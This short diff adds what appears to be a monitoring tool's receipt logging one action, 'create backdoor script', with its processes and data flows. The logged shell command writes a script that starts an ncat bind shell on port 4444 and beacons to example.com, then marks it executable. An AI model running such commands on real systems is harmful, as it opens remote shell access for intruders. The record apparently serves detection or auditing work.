@@ -1,0 +1,14 @@
+=== Post-Action Receipt: Action #1 ===
+Command: create backdoor script
+Duration: 1.2s | 8 syscall events
+
+PROCESSES: 2 unique, 0 forked, 0 exited
+  [sh:2623413] $ sh -c \n    echo "#!/bin/sh" > /tmp/backdoor.sh\n    echo "ncat -l -p 4444 -e /bin/sh &" >> /tmp/backdoor.sh\n    echo "curl -s http://example.com/beacon > /dev/null 2>&1 || true" >> /tmp/backdoor.sh\n    chmod +x /tmp/backdoor.sh\n
+  [chmod:2623420] $ chmod +x /tmp/backdoor.sh
+
+DATA FLOWS:
+  sh:2623413 -> chmod:2623420 (fork)
+  sh:2623413 reads /tmp/backdoor.sh
+  sh:2623413 writes /tmp/backdoor.sh
+
+
